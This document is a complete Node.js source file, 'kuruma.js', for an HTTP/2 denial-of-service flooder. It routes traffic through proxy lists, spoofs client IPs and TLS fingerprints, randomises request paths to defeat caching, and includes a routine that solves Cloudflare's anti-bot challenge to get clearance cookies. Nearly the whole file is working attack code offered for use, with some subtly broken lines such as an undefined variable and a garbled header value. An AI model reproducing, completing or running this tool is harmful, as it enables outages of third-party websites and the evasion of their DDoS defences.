const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs').promises;
const os = require('os');
const axios = require('axios');
const vm = require('vm');
const cheerio = require('cheerio');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node kuruma.js target time rate threads proxyfile`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]) || os.cpus().length,
    proxyFile: process.argv[6],
};

// Utility functions
class Utils {
    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    static randomElement(array) {
        return array[this.randomInt(0, array.length)];
    }

    static randomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        return Array(length).fill().map(() => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
    }

    static spoofIP() {
        return Array(4).fill().map(() => Math.floor(Math.random() * 255)).join('.');
    }
}

// Headers configuration
class Headers {
    static signatures = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
    ];

    static ciphers = [
        'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    ];

    static accepts = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    ];

    static userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36',
    ];

    static getHeaders(target) {
        return {
            ':method': 'GET',
            ':authority': target.host,
            ':path': `${target.path || '/'}?${Utils.randomString(5)}=${Utils.randomString(25)}`,
            ':scheme': 'https',
            'accept': Utils.randomElement(this.accepts),
            'user-agent': Utils.randomElement(this.userAgents),
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'x-forwarded-for': Utils.spoofIP(),
            'referer': `https://${target.host}/`,
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'TE': 'trailers',
            'sec-fetch-user': '?1',
            'x-requested-with': 'XMLHttpRequest',
        };
    }
}

// Cloudflare Bypass
class CloudflareBypass {
    static CHALLENGE_REGEX = /<script[^>]*>([\s\S]*?)<\/script>/i;
    static COOKIE_REGEX = /cf_clearance=([^;]+)/;

    static async bypass(proxy, uagent, target) {
        const headers = {
            'User-Agent': uagent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q= hammer',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        };

        try {
            const response = await axios({
                url: target,
                method: 'GET',
                proxy: {
                    host: proxy.split(':')[0],
                    port: parseInt(proxy.split(':')[1]),
                },
                headers,
                responseType: 'text',
                timeout: 10000,
            });

            if (response.status === 503 && response.data.includes('jschl')) {
                return await this.solveUAM(response.data, proxy, uagent, target);
            } else if (response.data.includes('cf-captcha-container')) {
                return null;
            }

            const cookie = response.headers['set-cookie']?.find(c => c.includes('cf_clearance'));
            if (cookie) {
                return cookie.split(';')[0];
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    static async solveUAM(body, proxy, uagent, target) {
        const $ = cheerio.load(body);
        const script = $('script').first().html();
        if (!script) return null;

        const sandbox = {
            document: { cookie: '' },
            location: { href: target, hostname: url.parse(target).hostname },
            navigator: { userAgent: uagent },
        };

        try {
            vm.runInNewContext(script, sandbox, { timeout: 5000 });

            const jschlVc = $('input[name="jschl_vc"]').attr('value');
            const pass = $('input[name="pass"]').attr('value');
            if (!jschlVc || !pass) return null;

            const jschlAnswer = this.calculateAnswer(script, sandbox.location.hostname);
            const verifyUrl = `${target}/cdn-cgi/l/chk_jschl?jschl_vc=${jschlVc}&pass=${pass}&jschl_answer=${jschlAnswer}`;
            const verifyResponse = await axios({
                url: verifyUrl,
                method: 'GET',
                proxy: {
                    host: proxy.split(':')[0],
                    port: parseInt(proxy.split(':')[1]),
                },
                headers: { 'User-Agent': uagent, 'Referer': target },
                responseType: 'text',
                timeout: 10000,
            });

            const cookie = verifyResponse.headers['set-cookie']?.find(c => c.includes('cf_clearance'));
            if (cookie) {
                return cookie.split(';')[0];
            }
            return null;
        } catch (error) {
            return null;
        }
    }

    static calculateAnswer(jsCode, hostname) {
        const answerMatch = jsCode.match(/a\.value\s*=\s*([^;]+)/);
        if (!answerMatch) return 0;

        let answer = eval(answerMatch[1]);
        const additional = jsCode.match(/([+\-*])\s*(\d+)/g);
        if (additional) {
            additional.forEach(op => {
                const [, operator, value] = op.match(/([+\-*])\s*(\d+)/);
                if (operator === '+') answer += parseInt(value);
                if (operator === '-') answer -= parseInt(value);
                if (operator === '*') answer *= parseInt(value);
            });
        }
        return answer + hostname.length;
    }
}

// Rate Limiting Handler
class RateLimiter {
    constructor(maxErrors = 10, interval = 60000) {
        this.errorCount = 0;
        this.maxErrors = maxErrors;
        this.interval = interval;
        this.lastReset = Date.now();
    }

    checkRateLimit(statusCode, flooder) {
        if (Date.now() - this.lastReset >= this0) {
            this.errorCount = 0;
            this.lastReset = Date.now();
        }

        if (statusCode === 429) {
            this.errorCount++;
            if (this.errorCount > this.maxErrors) {
                flooder.rate = Math.max(flooder.rate - 10, 10);
            }
        } else if (this.errorCount === 0 && statusCode < 400) {
            flooder.rate = Math.min(flooder.rate + 10, args.Rate);
        }
    }
}

// NetSocket for Proxy Connection
class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on('connect', () => {
            connection.write(Buffer.from(payload));
        });

        connection.on('data', (chunk) => {
            const response = chunk.toString('utf-8');
            const isAlive = response.includes('HTTP/1.1 200');
            if (isAlive) {
                callback(connection, undefined);
            } else {
                connection.destroy();
                callback(undefined, 'error: invalid response from proxy server');
            }
        });

        connection.on('timeout', () => {
            connection.destroy();
            callback(undefined, 'error: timeout exceeded');
        });

        connection.on('error', (error) => {
            connection.destroy();
            callback(undefined, `error: ${error}`);
        });
    }
}

const Socker = new NetSocket();

// Main Flooder class
class Flooder {
    constructor({ target, time, rate, threads, proxyFile }) {
        this.target = url.parse(target);
        this.duration = time * 1000;
        this.rate = rate;
        this.threads = threads;
        this.proxyFile = proxyFile;
        this.proxies = [];
        this.cookies = new Map();
        this.isRunning = false;
        this.rateLimiter = new RateLimiter();
    }

    async initialize() {
        try {
            const allProxies = await fs.readFile(this.proxyFile, 'utf-8').then(data => data.split(/\r?\n/).filter(Boolean));
            this.proxies = allProxies;
        } catch (error) {
            throw new Error(`Initialization failed: ${error.message}`);
        }
    }

    async start() {
        if (this.isRunning) return;
        this.isRunning = true;

        if (cluster.isMaster) {
            for (let i = 0; i < this.threads; i++) cluster.fork();
        } else {
            this.runWorker();
        }

        setTimeout(() => process.exit(0), this.duration);
    }

    runWorker() {
        const parsedTarget = this.target;
        const proxies = this.proxies;

        function runFlooder() {
            const proxy = Utils.randomElement(proxies).split(":");
            const headers = buildHeaders(parsedTarget);
            Socker.HTTP({ host: proxy[0], port: ~~proxy[1], address: parsedTarget.host + ":443", timeout: 10 }, (connection, error) => {
                if (error) return;
                const tlsConn = tls.connect(443, parsedTarget.host, {
                    port: 443,
                    secure: true,
                    ALPNProtocols: ["h2"],
                    ciphers: Utils.randomElement(Headers.ciphers),
                    sigalgs: sigalgs.join(':'),
                    requestCert: true,
                    socket: connection,
                    ecdhCurve: ecdhCurve,
                    honorCipherOrder: false,
                    rejectUnauthorized: false,
                    secureOptions: secureOptions,
                    secureContext: tls.createSecureContext({
                        ciphers: ciphers,
                        sigalgs: sigalgs.join(':'),
                        honorCipherOrder: true,
                        secureOptions: secureOptions,
                        secureProtocol: "TLS_method"
                    }),
                    host: parsedTarget.host,
                    servername: parsedTarget.host,
                    secureProtocol: "TLS_method"
                });

                tlsConn.setKeepAlive(true, 600000);
                tlsConn.setMaxListeners(0);

                const client = http2.connect(parsedTarget.href, {
                    settings: {
                        headerTableSize: 65536,
                        maxHeaderListSize: 32768,
                        initialWindowSize: 15564991,
                        maxFrameSize: 16384,
                    },
                    createConnection: () => tlsConn,
                });

                client.setMaxListeners(0);
                client.on("connect", () => {
                    setInterval(() => {
                        for (let i = 0; i < args.Rate; i++) {
                            const dynHeaders = { ...headers, ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)] };
                            sendRequest(client, dynHeaders, args);
                        }
                    }, 300);
                });

                client.on("close", () => {
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });

                client.on("timeout", () => {
                    client.destroy();
                    connection.destroy();
                });

                client.on("error", () => {
                    client.destroy();
                    connection.destroy();
                });
            });
        }

        runFlooder();
    }
}

// Placeholder definitions for missing variables
const sigalgs = ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'];
const ecdhCurve = 'prime256v1:X25519';
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1;
const ciphers = tls.getCiphers().join(':');
const rateHeaders = [
    { 'x-requested-with': 'XMLHttpRequest' },
    { 'x-forwarded-for': Utils.spoofIP() },
];

function buildHeaders(target) {
    return Headers.getHeaders(target);
}

function sendRequest(client, headers, args) {
    const req = client.request(headers);
    req.on('response', (headers) => {
        req.close();
        req.destroy();
    });
    req.on('error', () => {});
    req.end();
}

// Main execution
async function main() {
    const flooder = new Flooder({
        target: args.target,
        time: args.time,
        rate: args.Rate,
        threads: args.threads,
        proxyFile: args.proxyFile,
    });

    try {
        await flooder.initialize();
        await flooder.start();
    } catch (error) {
        console.error(`[ERROR] Startup failed: ${error.message}`);
        process.exit(1);
    }
}

main().catch(console.error);